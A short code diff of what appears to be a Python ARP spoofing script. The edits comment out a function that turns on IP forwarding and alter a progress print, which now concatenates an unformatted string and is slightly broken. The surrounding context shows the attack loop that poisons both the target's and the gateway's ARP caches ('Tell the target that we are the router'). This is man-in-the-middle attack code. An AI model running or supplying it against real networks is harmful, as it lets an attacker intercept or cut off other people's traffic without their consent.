@@ -13,17 +13,17 @@ print('Running. Your euid is', + euid)
 print("---------------------------------------------------------")
 
 
-def _enable_linux_iproute():
-    """
-    Enables IP route ( IP Forward ) in linux-based distro
-    """
-    file_path = "/proc/sys/net/ipv4/ip_forward"
-    with open(file_path) as f:
-        if f.read() == 1:
-            # already enabled
-            return
-    with open(file_path, "w") as f:
-        print(1, file=f)
+# def _enable_linux_iproute():
+#     """
+#     Enables IP route ( IP Forward ) in linux-based distro
+#     """
+#     file_path = "/proc/sys/net/ipv4/ip_forward"
+#     with open(file_path) as f:
+#         if f.read() == 1:
+#             # already enabled
+#             return
+#     with open(file_path, "w") as f:
+#         print(1, file=f)
 
 
 def get_mac(ip):
@@ -57,7 +57,7 @@ try:
         spoof(target_ip, gateway_ip)  # Tell the target that we are the router
         spoof(gateway_ip, target_ip)  # Tell the router that we are the target
         sent_packets = sent_packets + 2
-        print("\r[+] Packets Sent {}".format(sent_packets), end="")
+        print("\r[+] Packets Sent {}" + str(sent_packets))
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
